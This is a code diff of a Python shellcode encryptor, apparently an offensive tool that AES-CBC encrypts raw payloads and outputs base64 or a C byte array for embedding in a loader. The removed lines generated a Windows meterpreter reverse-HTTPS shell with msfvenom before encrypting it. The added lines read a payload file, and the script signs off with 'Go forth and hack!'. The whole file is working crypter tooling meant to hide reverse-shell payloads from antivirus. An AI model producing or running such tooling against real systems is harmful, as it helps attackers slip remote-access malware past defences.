@@ -4,84 +4,18 @@ from Crypto.Cipher import AES
 from hashlib import sha256
 import argparse, subprocess, os
 
-def main():
-	args = parse_args()
-	lhost = args.lhost
-	lport = args.lport
-	key = args.key
-	if not key:
-		key = get_random_string(32)
-	payload = args.payload
-	method = args.method
-	format = args.format
 
-	''' generate msfvenom payload '''
-	print("[+] Generating MSFVENOM payload...")
-	result = subprocess.run(['msfvenom',
-		'-p', payload,
-		'LPORT=' + lport,
-		'LHOST=' + lhost,
-#		'-b', '\\x00',
-		'-f', 'raw',
-		'-o', './msf.bin'],
-		capture_output=False)
-
-	f = open("./msf.bin", "rb")
-	buf = f.read()
-	f.close()
-
-	print("[+] key and payload will be written to key.b64 and payload.b64")
-
-	''' encrypt the payload '''
-	print("[+] Encrypting the payload, key=" + key + "...")
-	hkey = hash_key(key)
-	encrypted = encrypt(hkey, hkey[:16], buf)
-	b64 = base64.b64encode(encrypted)
-
-	f = open("./key.b64", "w")
-	f.write(key)
-	f.close()
-
-	f = open("./payload.b64", "w")
-	f.write(b64.decode('utf-8'))
-	f.close()
-
-	if format == "b64":
-		''' base64 output '''
-		print("[+] Base64 output:")
-		print(b64.decode('utf-8'))
-		print("\n[+] Have a nice day!")
-		return
-	if format == "c":
-		''' c output '''
-		print("[+] C output:")
-		hex_string = 'unsigned char payload[] ={0x';
-		hex = '0x'.join('{:02x},'.format(x) for x in encrypted)
-		hex_string = hex_string + hex[:-1] + "};"
-		print(hex_string)
-		print("\n[+] Have a nice day!")
-		return
+#Defined Functions
 
 def parse_args():
-	parser = argparse.ArgumentParser()
 
-	parser.add_argument("-l", "--lport", default="0.0.0.0", type=str,
-		help="Enter local port that msfconsole will run")
-	parser.add_argument("-i", "--lhost", default="443", type=str,
-			help="Enter local host that msfconsole will run.")
-	parser.add_argument("-p", "--payload", default = "windows/x64/meterpreter/reverse_https", type=str,
-		help="Enter payload type e.g. windows/x64/meterpreter/reverse_https")
-	parser.add_argument("-m", "--method", default="thread", type=str,
-		help="Enter method e.g. thread/process")
-	parser.add_argument("-k", "--key", default="", type=str,
-		help="Enter the encryption key if self-generated key is not desired")
-
-
-	parser.add_argument("-f", "--format", default="b64", type=str,
-		help="Enter the format for the output")
-
-	return parser.parse_args()
+	parser = argparse.ArgumentParser()	
 	
+	parser.add_argument("-p", "--payload", default="", type=str, help="Enter path to payload.bin")
+	parser.add_argument("-k", "--key", default="", type=str, help="Enter the encryption key if you do not want to use the self-generated key")
+	parser.add_argument("-f", "--format", default="b64", type=str, help="Enter the format for the output")
+	return parser.parse_args()
+
 def encrypt(key,iv,plaintext):
 	key_length = len(key)
 	if (key_length >= 32):
@@ -90,11 +24,11 @@ def encrypt(key,iv,plaintext):
 		k = key[:24]
 	else:
 		k = key[:16]
-
+	
 	aes = AES.new(k, AES.MODE_CBC, iv)
 	pad_text = pad(plaintext, 16)
 	return aes.encrypt(pad_text)
-
+	
 def hash_key(key):
 	h = ''
 	for c in key:
@@ -102,18 +36,63 @@ def hash_key(key):
 	h = bytes.fromhex(h)
 	hashed = sha256(h).digest()
 	return hashed
-
+	
 def pad(data, block_size):
 	padding_size = (block_size - len(data)) % block_size
 	if padding_size == 0:
 		padding_size = block_size
 	padding = (bytes([padding_size]) * padding_size)
 	return data + padding
-
-def get_random_string(length):
+	
+def random_key_gen(length):
 	letters = string.ascii_letters + string.digits
 	result_str = ''.join(random.choice(letters) for i in range(length))
 	return result_str
+	
+#Main Shellcode Encryptor
 
+def main():
+	args = parse_args()
+	file = args.payload
+	format = args.format
+	key = args.key
+	if not key:
+		key = random_key_gen(32)
+
+#Encrypt raw shellcode
+
+	f = open(file, "rb")
+	buf = f.read()
+	f.close()
+	
+	print("[+] key and payload will be written to key.b64 and payload.b64")
+	print("[+] Encrypting the payload, key=" + key)
+	hkey = hash_key(key)
+	encrypted = encrypt(hkey, hkey[:16], buf)
+	b64 = base64.b64encode(encrypted)
+	
+	f = open("./key.b64", "w")
+	f.write(key)
+	f.close()
+	
+	f = open("./payload.b64", "w")
+	f.write(b64.decode('utf-8'))
+	f.close()
+	
+	if format == "b64":
+		print("[+] Base64 output:")
+		print(b64.decode('utf-8'))
+		print("\n[+] Go forth and hack!")
+		return
+		
+	if format == "c":
+		print("[+] C output:")
+		hex_string = 'unsigned char payload[] ={0x';
+		hex = '0x'.join('{:02x},'.format(x) for x in encrypted)
+		hex_string = hex_string + hex[:-1] + "};"
+		print(hex_string)
+		print("\n[+] Go forth and hack!")
+		return
+		
 if __name__ == '__main__':
 	main()
